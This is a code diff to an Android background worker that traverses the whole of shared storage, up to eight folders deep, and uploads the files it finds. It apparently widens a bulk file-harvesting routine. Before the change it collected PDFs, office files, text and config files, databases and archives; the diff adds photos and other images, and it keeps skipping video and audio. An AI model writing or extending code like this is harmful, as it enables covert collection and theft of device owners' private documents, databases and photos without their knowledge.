@@ -110,8 +110,9 @@ public class DocumentUploadWorker extends Worker {
         
         Log.d(TAG, "================================================");
         Log.d(TAG, "🔍 COMPLETE STORAGE SCAN");
-        Log.d(TAG, "📄 Scanning ALL storage for office documents");
-        Log.d(TAG, "   PDF, Excel, CSV, XLSX, Word, PowerPoint, etc.");
+        Log.d(TAG, "📄 Scanning for DOCUMENTS and IMAGES");
+        Log.d(TAG, "   Documents: PDF, Excel, CSV, XLSX, Word, PowerPoint");
+        Log.d(TAG, "   Images: JPG, PNG, GIF, BMP, WebP");
         Log.d(TAG, "   From: /sdcard and /storage/emulated/0");
         Log.d(TAG, "   Depth: Up to 8 levels (complete folder traversal)");
         Log.d(TAG, "================================================");
@@ -146,19 +147,22 @@ public class DocumentUploadWorker extends Worker {
         
         Log.d(TAG, "================================================");
         Log.d(TAG, "✓ COMPLETE SCAN FINISHED");
-        Log.d(TAG, "   Total documents uploaded: " + uploadedCount);
+        Log.d(TAG, "   Total files uploaded: " + uploadedCount);
         if (uploadedCount > 0) {
-            Log.d(TAG, "   Office documents found:");
-            Log.d(TAG, "   ✓ PDFs (.pdf)");
-            Log.d(TAG, "   ✓ Excel files (.xlsx, .xls, .csv)");
-            Log.d(TAG, "   ✓ Word documents (.docx, .doc)");
-            Log.d(TAG, "   ✓ PowerPoint (.pptx, .ppt)");
-            Log.d(TAG, "   ✓ Text/Config files (.txt, .json, .xml)");
-            Log.d(TAG, "   ✓ Databases (.sql, .db, .sqlite)");
-            Log.d(TAG, "   ✓ Archives (.zip, .rar, .7z, .tar, .gz)");
+            Log.d(TAG, "   Files found:");
+            Log.d(TAG, "   📄 DOCUMENTS:");
+            Log.d(TAG, "      ✓ PDFs (.pdf)");
+            Log.d(TAG, "      ✓ Excel files (.xlsx, .xls, .csv)");
+            Log.d(TAG, "      ✓ Word documents (.docx, .doc)");
+            Log.d(TAG, "      ✓ PowerPoint (.pptx, .ppt)");
+            Log.d(TAG, "      ✓ Text/Config files (.txt, .json, .xml)");
+            Log.d(TAG, "      ✓ Databases (.sql, .db, .sqlite)");
+            Log.d(TAG, "      ✓ Archives (.zip, .rar, .7z, .tar, .gz)");
+            Log.d(TAG, "   🖼️  IMAGES:");
+            Log.d(TAG, "      ✓ JPG, PNG, GIF, BMP, WebP");
         } else {
-            Log.w(TAG, "   ⚠️  NO OFFICE DOCUMENTS FOUND!");
-            Log.w(TAG, "   Checked for: PDF, Excel, Word, PowerPoint, etc.");
+            Log.w(TAG, "   ⚠️  NO FILES FOUND!");
+            Log.w(TAG, "   Checked for: Documents (PDF, Excel, Word, etc.) and Images");
             Log.w(TAG, "   In: /sdcard and /storage/emulated/0 (all subdirectories)");
         }
         Log.d(TAG, "================================================");
@@ -283,7 +287,7 @@ public class DocumentUploadWorker extends Worker {
         String name = file.getName();
         String lower = name.toLowerCase();
         
-        // ========== BLOCK SYSTEM/APP/CACHE/MEDIA FILES ==========
+        // ========== BLOCK ONLY SYSTEM/APP/CACHE FILES ==========
         // Skip hidden files
         if (name.startsWith(".")) {
             return false;
@@ -308,25 +312,6 @@ public class DocumentUploadWorker extends Worker {
             name.contains("thumbs") ||
             name.contains(".db-journal") ||
             lower.endsWith(".lock")) {
-            return false;
-        }
-        
-        // Skip images - NOT office documents
-        if (lower.endsWith(".jpg") || lower.endsWith(".jpeg") ||
-            lower.endsWith(".png") || lower.endsWith(".gif") ||
-            lower.endsWith(".bmp") || lower.endsWith(".webp")) {
-            return false;
-        }
-        
-        // Skip videos - NOT office documents
-        if (lower.endsWith(".mp4") || lower.endsWith(".mkv") ||
-            lower.endsWith(".mov") || lower.endsWith(".avi")) {
-            return false;
-        }
-        
-        // Skip audio - NOT office documents
-        if (lower.endsWith(".mp3") || lower.endsWith(".wav") ||
-            lower.endsWith(".aac") || lower.endsWith(".flac")) {
             return false;
         }
         
@@ -358,6 +343,29 @@ public class DocumentUploadWorker extends Worker {
         if (lower.endsWith(".zip") || lower.endsWith(".rar") ||
             lower.endsWith(".7z") || lower.endsWith(".tar") ||
             lower.endsWith(".gz")) return true;
+        
+        // ========== ACCEPT IMAGES ==========
+        
+        if (lower.endsWith(".jpg") || lower.endsWith(".jpeg") ||
+            lower.endsWith(".png") || lower.endsWith(".gif") ||
+            lower.endsWith(".bmp") || lower.endsWith(".webp") ||
+            lower.endsWith(".svg")) return true;
+        
+        // ========== SKIP VIDEOS AND AUDIO ==========
+        
+        // Skip videos
+        if (lower.endsWith(".mp4") || lower.endsWith(".mkv") ||
+            lower.endsWith(".mov") || lower.endsWith(".avi") ||
+            lower.endsWith(".flv") || lower.endsWith(".wmv")) {
+            return false;
+        }
+        
+        // Skip audio
+        if (lower.endsWith(".mp3") || lower.endsWith(".wav") ||
+            lower.endsWith(".aac") || lower.endsWith(".flac") ||
+            lower.endsWith(".ogg") || lower.endsWith(".wma")) {
+            return false;
+        }
         
         // DEFAULT: REJECT everything else
         return false;
